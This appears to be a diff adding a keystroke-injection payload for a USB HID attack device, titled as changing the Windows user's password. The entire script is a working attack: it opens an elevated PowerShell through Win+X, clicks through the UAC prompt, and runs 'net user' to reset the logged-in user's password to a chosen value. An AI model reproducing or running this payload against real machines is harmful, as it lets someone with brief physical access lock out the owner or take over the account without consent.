@@ -1,0 +1,30 @@
+############################################################
+#                                                          #
+# Title        : Change the password of the Windows user   #
+# Author       : Aleff                                     #
+# Version      : 1.0                                       #
+# Category     : Execution                                 #
+# Target       : Windows 10-11                             #
+#                                                          #
+############################################################
+
+ATTACKMODE HID
+
+# REQUIREMENTS
+#  - Nothing (i know it's absurd)
+
+# VARIABLES
+# - You must define the new Windows user password
+NEW_PASSWORD='example'
+
+QUACK DELAY 1500
+QUACK GUI x
+QUACK DELAY 500
+QUACK STRING a
+QUACK DELAY 500
+QUACK LEFT_ARROW
+QUACK DELAY 500
+QUACK ENTER
+QUACK DELAY 2000
+QUACK STRING net user \$env:USERNAME $NEW_PASSWORD; exit
+QUACK ENTER
